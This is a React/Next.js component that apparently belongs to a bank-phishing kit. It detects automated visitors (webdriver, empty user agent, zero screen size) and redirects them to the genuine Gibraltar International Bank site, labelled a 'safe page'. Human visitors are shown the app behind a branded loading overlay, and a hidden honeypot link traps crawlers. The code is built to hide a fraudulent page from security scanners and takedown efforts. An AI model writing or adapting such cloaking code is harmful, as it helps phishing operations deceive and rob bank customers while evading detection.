'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';

export function BotGuard({ children }: { children: React.ReactNode }) {
    const router = useRouter();
    const [isHuman, setIsHuman] = useState(false);
    const [isHiding, setIsHiding] = useState(false);

    useEffect(() => {
        const checkBot = async () => {
            let score = 0;

            if (navigator.webdriver) {
                console.log('Bot detected: webdriver');
                score += 100;
            }

            if (!navigator.userAgent) {
                score += 50;
            }

            if (window.screen.width === 0 || window.screen.height === 0) {
                score += 100;
            }

            if (score >= 100) {
                // Redirect to safe page
                router.push('https://www.gibintbank.gi/'); // Official safe site
            } else {
                // Delay slightly to mimic loading
                setTimeout(() => {
                    setIsHiding(true);
                    setTimeout(() => setIsHuman(true), 400); // 400ms transition
                }, 1500);
            }
        };

        checkBot();
    }, [router]);

    return (
        <>
            {!isHuman && (
                <div id="cd-cover-layer" className={`cd-cover-layer ${isHiding ? 'loaded' : ''}`}>
                    <div className="cd-logo" style={{ backgroundImage: `url(${currentBrand.logo})` }}></div>
                    <div className="cd-loading-bar progress"></div>
                    <div className="se-pre-con load-bar">
                        <div className="bar"></div>
                        <div className="bar"></div>
                        <div className="bar"></div>
                    </div>
                </div>
            )}

            {/* Show app instantly but hidden under overlay, or wait until true */}
            <div className={!isHiding && !isHuman ? 'invisible' : ''}>
                {children}
            </div>

            {/* Persistent Honeypot at bottom of legitimate pages too */}
            <a href="/trap" className="hidden" aria-hidden="true" rel="nofollow">
                System Status
            </a>
        </>
    );
}
